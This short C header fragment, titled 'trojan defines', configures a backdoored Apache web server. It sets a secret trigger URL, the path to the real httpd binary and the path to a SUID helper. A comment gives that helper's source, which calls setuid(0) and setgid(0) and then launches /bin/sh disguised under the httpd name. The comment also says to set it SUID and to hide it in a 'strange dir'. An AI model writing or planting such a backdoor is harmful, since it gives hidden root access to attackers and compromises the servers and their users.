/* trojan defines */

#define PATH_TO_HTTPD "/usr/local/apache/bin/httpd"
#define EVIL_URL "/keep/on/rolling/babe"
#define SUID_CODE "/tmp/s"

/* /tmp/s is a simple C program suid (chmod 6755 prog) and looks like:

main()
{
setuid(0);
setgid(0);
execl("/bin/sh","<AGAIN PATH_TO_HTTPD>",(char *)0);
}

put it in some strange dir, and hide it.

/* end of trojan defines */
